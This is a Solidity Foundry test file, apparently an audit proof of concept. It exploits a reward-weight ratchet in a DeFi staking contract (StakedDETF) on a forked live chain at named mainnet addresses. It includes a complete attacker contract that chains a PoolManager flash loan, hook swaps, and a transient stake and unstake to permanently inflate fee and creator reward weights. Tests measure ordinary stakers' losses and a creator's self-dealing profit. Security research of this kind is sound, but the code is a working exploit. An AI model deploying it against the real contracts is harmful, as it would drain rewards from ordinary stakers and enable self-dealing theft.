// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// h3-cross-family-flash: V4 PoolManager flash (free DTF) -> weighted hook DTF->DETF -> sDETF stake/unstake
/// sink: StakedDETF._topUpWeights is top-up-only against the CURRENT totalGons, so a transient stake
/// permanently ratchets the fee-to / creator standing reward weights. Every later reward funding
/// (issuance seigniorage, natural expansion) is then split with the inflated weights; ordinary stakers lose.
/// Live fork of Robinhood 4663 (read-only, nothing broadcast).

interface IERC20L {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ISE {
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256 amountOut, uint256 amountRefunded);
    function previewExchangeIn(address tokenIn, uint256 amountIn, address tokenOut) external view returns (uint256 amountOut, uint256 amountRefunded);
}

interface IStaked {
    struct StakingState {
        uint256 totalGons;
        uint256 gonsPerUnit;
        uint256 accountedBacking;
        uint256 allocationDust;
        uint256 stakingDust;
        uint256 feeWeight;
        uint256 creatorWeight;
    }
    function stakingState() external view returns (StakingState memory);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IPM {
    function unlock(bytes calldata data) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
    function settle() external payable returns (uint256);
}

interface IDetfSync {
    function synchronizeRewards() external;
}

address constant PM = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
address constant CUSTODY = 0x2E9C1F705aB967c5Af59249203d7495bDabb223b;
address constant HOOK = 0x46E068c2393e189Fbc86632f67210aF253a42Aa8;
address constant DETF = 0x4a5cFDC2b07016FCf917f4eD5A51C52111A0fcC7;
address constant SDETF = 0x4Fa4974a8a09660258B8edD430B51C1620eBFE5c;
address constant DTF = 0xeE5576Fa1Bcaa380e591D01245f406f3f384eb01;
address constant FEE_TO = 0x20af9A1e21a59a411cd3b0C40E70AF9084770b2E; // ownerOf(bond NFT #1)
address constant CREATOR = 0x72BeA6Fa3E68EF18c87D045Aac7C4Aa5249d933B; // ownerOf(bond NFT #2)

/// Unprivileged attacker contract.
contract Ratcheter3 {
    uint256 public detfPeak;

    function dl() internal view returns (uint256) { return block.timestamp + 1 hours; }

    function approveAll() external {
        IERC20L(DTF).approve(HOOK, type(uint256).max);
        IERC20L(DETF).approve(HOOK, type(uint256).max);
        IERC20L(DETF).approve(SDETF, type(uint256).max);
    }

    function attack(uint256 flashDtf) external {
        IPM(PM).unlock(abi.encode(flashDtf));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == PM, "pm only");
        uint256 flashDtf = abi.decode(data, (uint256));
        // 1. free intra-tx capital: borrow DTF from the PoolManager's flash accounting
        IPM(PM).take(DTF, address(this), flashDtf);
        // 2. buy DETF out of the weighted reserve hook in ratio-cap-safe chunks
        uint256 left = flashDtf;
        while (left > 0) {
            uint256 cap = IERC20L(DTF).balanceOf(CUSTODY) / 4;
            uint256 piece = left > cap ? cap : left;ISE(HOOK).exchangeIn(DTF, piece, DETF, 0, address(this), false, dl());
            left -= piece;
        }
        uint256 e = IERC20L(DETF).balanceOf(address(this));
        detfPeak = e;// 3. transient stake + immediate unstake (1:1, no lock)
        ISE(SDETF).exchangeIn(DETF, e, SDETF, 0, address(this), false, dl());
        uint256 s = IStaked(SDETF).balanceOf(address(this));ISE(SDETF).exchangeIn(SDETF, s, DETF, 0, address(this), false, dl());
        // 4. sell all DETF back to the hook
        uint256 bal = IERC20L(DETF).balanceOf(address(this));
        while (bal > 0) {
            uint256 hb = IERC20L(DETF).balanceOf(HOOK) / 5;
            uint256 piece = bal > hb ? hb : bal;ISE(HOOK).exchangeIn(DETF, piece, DTF, 0, address(this), false, dl());
            bal = IERC20L(DETF).balanceOf(address(this));
        }
        // 5. repay the flash principal (shortfall comes from the attacker's own DTF, counted as cost)
        IPM(PM).sync(DTF);
        require(IERC20L(DTF).transfer(PM, flashDtf), "repay");
        IPM(PM).settle();
        return "";
    }
}


contract R3StakingWeightRatchetTest is Test {
    address alice = makeAddr("aliceStaker");
    address bob = makeAddr("bobMinter");
    uint256 constant OWN_DTF = 20_000_000e18;

    function setUp() public {
        vm.createSelectFork(vm.envOr("LIVE_FORK_URL", string("https://rpc.mainnet.chain.robinhood.com")));
        console2.log("fork block", block.number);
        deal(DTF, alice, 2_000_000e18);
        vm.startPrank(alice);
        IERC20L(DTF).approve(DETF, type(uint256).max);(uint256 e,) = ISE(DETF).exchangeIn(DTF, 2_000_000e18, DETF, 0, alice, false, block.timestamp + 1);
        IERC20L(DETF).approve(SDETF, type(uint256).max);ISE(SDETF).exchangeIn(DETF, e, SDETF, 0, alice, false, block.timestamp + 1);
        vm.stopPrank();
        deal(DTF, bob, 50_000_000e18);
        vm.prank(bob);
        IERC20L(DTF).approve(DETF, type(uint256).max);
    }

    function _share(string memory tag) internal view returns (uint256 ordBps, uint256 crBps) {
        IStaked.StakingState memory st = IStaked(SDETF).stakingState();
        uint256 W = st.totalGons + st.feeWeight + st.creatorWeight;
        ordBps = st.totalGons * 10000 / W;
        crBps = st.creatorWeight * 10000 / W;
        console2.log(tag);
        console2.log("  totalGons", st.totalGons);
        console2.log("  feeWeight", st.feeWeight);
        console2.log("  creatorWeight", st.creatorWeight);
        console2.log("  ordinary bps of W", ordBps);
        console2.log("  fee bps of W", st.feeWeight * 10000 / W);
        console2.log("  creator bps of W", crBps);
    }

    function _reward(uint256 dtfIn) internal returns (uint256 a, uint256 f, uint256 c) {
        uint256 a0 = IStaked(SDETF).balanceOf(alice);
        uint256 f0 = IStaked(SDETF).balanceOf(FEE_TO);
        uint256 c0 = IStaked(SDETF).balanceOf(CREATOR);
        vm.prank(bob);ISE(DETF).exchangeIn(DTF, dtfIn, DETF, 0, bob, false, block.timestamp + 1);
        a = IStaked(SDETF).balanceOf(alice) - a0;
        f = IStaked(SDETF).balanceOf(FEE_TO) - f0;
        c = IStaked(SDETF).balanceOf(CREATOR) - c0;
    }

    function _attack(address who, uint256 flash) internal returns (uint256 cost) {
        vm.startPrank(who);
        Ratcheter3 r = new Ratcheter3();
        r.approveAll();
        vm.stopPrank();
        deal(DTF, address(r), OWN_DTF);
        vm.prank(who);
        r.attack(flash);
        cost = OWN_DTF - IERC20L(DTF).balanceOf(address(r));
        assertEq(IStaked(SDETF).balanceOf(address(r)), 0);
        assertEq(IERC20L(DETF).balanceOf(address(r)), 0);
        console2.log("  attack DETF peak", r.detfPeak());
        console2.log("  attack DTF cost", cost);
    }

    /// A: random unprivileged attacker; 3 sequential reward events control vs attacked (persistence).
    function test_A_griefPersistsAcrossRewards() public {
        _share("BEFORE");
        uint256 snap = vm.snapshotState();
        uint256 aC; uint256 fcC;
        uint256 bk0 = IStaked(SDETF).stakingState().accountedBacking;
        for (uint256 i; i < 3; i++) { (uint256 a, uint256 f, uint256 c) = _reward(2_000_000e18); aC += a; fcC += f + c; }
        uint256 fundedC = IStaked(SDETF).stakingState().accountedBacking - bk0;
        vm.revertToState(snap);
        address mallory = makeAddr("mallory");
        _attack(mallory, 100_000_000e18);
        _share("AFTER ATTACK");
        uint256 aA; uint256 fcA;
        uint256 bk1 = IStaked(SDETF).stakingState().accountedBacking;
        for (uint256 i; i < 3; i++) { (uint256 a, uint256 f, uint256 c) = _reward(2_000_000e18); aA += a; fcA += f + c; }
        uint256 fundedA = IStaked(SDETF).stakingState().accountedBacking - bk1;
        console2.log("total funded reward control ", fundedC);
        console2.log("total funded reward attacked", fundedA);
        // alice's share of the funded pot (normalises away any reward-size change caused by the hook round trip)
        console2.log("alice ppm of pot control ", aC * 1e6 / fundedC);
        console2.log("alice ppm of pot attacked", aA * 1e6 / fundedA);
        assertLt(aA * 1e18 / fundedA, aC * 1e18 / fundedC, "alice share of pot not reduced");
        console2.log("alice 3-event gain control ", aC);
        console2.log("alice 3-event gain attacked", aA);
        console2.log("alice loss bps", (aC - aA) * 10000 / aC);
        console2.log("fee+creator control ", fcC);
        console2.log("fee+creator attacked", fcA);
        assertLt(aA, aC);
        _share("AFTER 3 REWARDS");
    }

    /// B: the creator (ownerOf bond NFT #2; a non-admin role) self-deals. Value its extra sDETF at the hook.
    function test_B_creatorSelfDealProfit() public {
        uint256 snap = vm.snapshotState();
        uint256 cC;
        for (uint256 i; i < 3; i++) { (,, uint256 c) = _reward(2_000_000e18); cC += c; }
        vm.revertToState(snap);
        uint256 cost = _attack(CREATOR, 100_000_000e18);
        uint256 cA;
        for (uint256 i; i < 3; i++) { (,, uint256 c) = _reward(2_000_000e18); cA += c; }
        uint256 extra = cA - cC;(uint256 extraDtf,) = ISE(HOOK).previewExchangeIn(DETF, extra, DTF);
        console2.log("creator sDETF over 3 rewards control ", cC);
        console2.log("creator sDETF over 3 rewards attacked", cA);
        console2.log("creator extra sDETF (1:1 DETF)", extra);
        console2.log("creator extra valued in DTF at hook", extraDtf);
        console2.log("creator attack cost DTF", cost);
        if (extraDtf > cost) console2.log("creator NET PROFIT DTF", extraDtf - cost);
        else console2.log("creator NET LOSS DTF", cost - extraDtf);
    }

    /// C: does a second, bigger round push the ratchet further (bounded by peak)?
    function test_C_repeatRatchet() public {
        _share("BEFORE");
        _attack(makeAddr("m1"), 100_000_000e18);
        _share("AFTER ROUND 1");
        _attack(makeAddr("m2"), 100_000_000e18);
        _share("AFTER ROUND 2 (same size)");
    }
}
